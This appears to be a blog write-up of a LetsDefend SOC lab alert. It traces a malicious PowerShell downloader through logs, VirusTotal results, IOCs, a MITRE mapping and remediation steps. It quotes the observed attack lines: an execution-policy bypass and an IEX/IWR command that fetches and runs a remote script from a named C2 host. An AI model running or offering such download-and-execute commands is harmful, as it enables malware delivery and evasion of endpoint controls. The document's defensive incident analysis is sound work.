---
title: "SOC153 Case Study: Malicious PowerShell Execution Leading to Active Malware Infection"
date: 2026-02-03
tags: [letsdefend, soc, blue-team, malware-analysis, powershell, endpoint-security]
categories: [SOC Writeups, Malware & Endpoint]
draft: false
---

**Event ID:** 238  
**Rule Name:** SOC153 – Suspicious PowerShell Script Executed  
**Severity:** HIGH  
**Category:** Endpoint Compromise / Malware  
**Event Time:** March 14, 2024 – 05:23 PM  
**Compromised Host:** Tony (172.16.17.206)

Tony at work opened a suspicious file they probably shouldn't have. It was like finding a strange USB drive in the parking lot and plugging it into your computer  you don't know what's on it, but it starts doing things automatically.It ran some code that gave access to the malicious actors who have now taken over the system in this scenario.
## Incident Analysis Summary

|**Field**|**Analysis**|
|---|---|
|**Alert Name**|SOC153 - Suspicious Powershell Script Executed|
|**Severity**|High (Potential Malware Execution)|
|**Event ID**|238|
|**Event Time**|Mar 14, 2024, 05:23 PM|
|**Compromised Host**|Tony (172.16.17.206)|
## 1. Alert Overview

The alert was triggered due to the execution of a suspicious PowerShell script (`payload_1.ps1`) on an endpoint. The detection indicated potential malware or unwanted software execution using PowerShell with execution policy bypass techniques.

Initial triage required verification of logs to determine whether the activity represented a **false positive** or a **successful attack**.

![](https://i.ibb.co/0v6tVcd/Pasted-image-20260203161116.png)

## 2. Detection & Verification

Log analysis was conducted in **Log Management** by searching for the affected host IP:

**Client IP:** `172.16.17.206`

The following log sources were reviewed:

- Firewall logs
- DNS logs
- Proxy logs
- Endpoint / OS logs
PowerShell operational logs confirmed execution of:
- `payload_1.ps1`
- Execution time: **05:23 PM**
The script execution was observed under **PowerShell Event ID [4104](https://www.myeventlog.com/search/show/980), confirming script block logging.  Based on this evidence, the alert was verified as a **True Positive**.

![](https://i.ibb.co/JjMzT7LP/Pasted-image-20260203161456.png)
## 3. Incident Analysis

### Initial Access – Drive-by Compromise

A search for `payload_1.ps1` revealed the following download source in proxy logs:
```url
hxxps://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1
```

![](https://i.ibb.co/Xxr9JFd0/Pasted-image-20260203161819.png)
- Proxy action: **Allowed**
- No associated phishing email found in Email Security logs
**Conclusion:**  Initial access occurred via **Drive-by Compromise**, where the user downloaded and executed a malicious script from the web rather than through email.


### Malware Execution

The malicious PowerShell script was executed from the user’s 
**Downloads** directory and bypassed execution policy restrictions using the following command:
![](https://i.ibb.co/svjJn1c5/Pasted-image-20260203161256.png)

```powershell
Set-ExecutionPolicy -Scope Process Bypass
```
Observed execution command:
```powershell
powershell.exe -Command IEX(IWR -UseBasicParsing 'hxxps://kionagranada.com/upload/sd2.ps1')
```
This confirms:
- User execution 
- PowerShell abuse
- Execution policy bypass
### Command & Control (C2) Activity

Threat intelligence and log analysis identified outbound communication to:
![](https://i.ibb.co/PzbLWJkC/Pasted-image-20260203161126.png)
```url
kionagranada[.]com
```
Resolved IP:
```ip
161[.]22[.]46[.]148
```
-  AV/EDR detected the malicious activity
- **Malware NOT quarantined/cleaned** (active on system)
- Execution observed in process logs
Firewall logs confirmed **successful outbound connections**, validating active **Command & Control communication**.

## 4. Reputation & Threat Intelligence

The SHA-256 hash of `payload_1.ps1` was analyzed using VirusTotal:
![](https://i.ibb.co/Tq4yBbYr/Pasted-image-20260203161551.png)

### VirusTotal Findings

- **46 / 71 vendors** flagged the file as malicious
- Classified as **Trojan / PowerShell Downloader**
- Associated with additional payload delivery
- Network indicators linked to known malicious infrastructure

#### Notable PowerShell Cmdlets Observed
- `Invoke-WebRequest (IWR)` – Remote payload retrieval
- `Invoke-Expression (IEX)` – In-memory execution
- `New-Object` – Object instantiation
- `Where-Object` – Data filtering
- `Write-Output` – Script output handling

![](https://i.ibb.co/BVZ5ysXz/Pasted-image-20260203161623.png)
## 5. Indicators of Compromise (IOCs)

|Category|Value|
|---|---|
|File Name|payload_1.ps1|
|SHA-256|db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0|
|C2 Domain|kionagranada.com|
|C2 IPs|161[.]22.46.148, 91[.]236.116.163|
|Malicious URLs|hxxps://kionagranada.com/upload/sd2.ps1|
|Host IP|172[.]16.17.206|

![](https://i.ibb.co/G3kTwJZX/Pasted-image-20260203165107.png)
## 6. MITRE ATT&CK Mapping

|Tactic|Technique|ID|
|---|---|---|
|Initial Access|Drive-by Compromise|T1189|
|Execution|PowerShell|T1059.001|
|Execution|User Execution|T1204|
|Defense Evasion|Execution Policy Bypass|T1562|
|Command & Control|Web Protocols|T1071.001|
|Command & Control|Ingress Tool Transfer|T1105|


## 7. Sigma Rule and Yara Rule
- Sigma: [Suspicious PowerShell IEX with Web Download](https://github.com/w3nch/Sigma-rules/blob/main/LetsDefend/SOC153%20-%20Suspicious%20Powershell%20Script%20ExecutedName/Suspicious%20PowerShell%20IEX%20with%20Web%20Download.yml)
- Yara: [Malicious_PowerShell_Downloader](https://github.com/w3nch/YARA-rules/blob/main/SOC153%20Event%20ID%20238/Malicious_PowerShell_Downloader.yml)

## Immediate Actions Taken

1. **Containment**: Endpoint containment initiated via EDR
2. **C2 Confirmation**: Verified C2 communication occurred
3. **Threat Indicator**: Marked as malicious infrastructure

## Recommended Next Steps

### Short-term (Remediation):

- Isolate host "Tony" from network
- Perform full malware scan/removal
- Reset credentials for affected user account
- Block C2 domains at firewall/proxy level
### Medium-term (Prevention):

- Implement PowerShell logging (Module/Transcript)
- Restrict PowerShell execution policies
- Enhance endpoint detection rules for IEX/IWR patterns
- User awareness training on suspicious downloads

### Long-term (Hardening):

- Application whitelisting for PowerShell
- Implement AMSI (Anti-Malware Scan Interface)
- Regular security baseline reviews

## Final Assessment

**True Positive - Active Malware Infection**

The incident represents a successful malware execution with confirmed C2 communication. The attacker achieved initial access through user execution of a malicious PowerShell script, bypassed security controls, and established remote command capabilities.

**Risk Level**: CRITICAL

- Data exfiltration possible
- Lateral movement potential
- Persistence mechanisms likely installed

 Lessons Learned

- User awareness training is critical to prevent execution of unknown scripts
- PowerShell execution policies alone are insufficient
- Script block logging (Event ID 4104) is essential for detection
- Web-based payload delivery must be monitored and restricted
- EDR solutions must actively block, not just alert











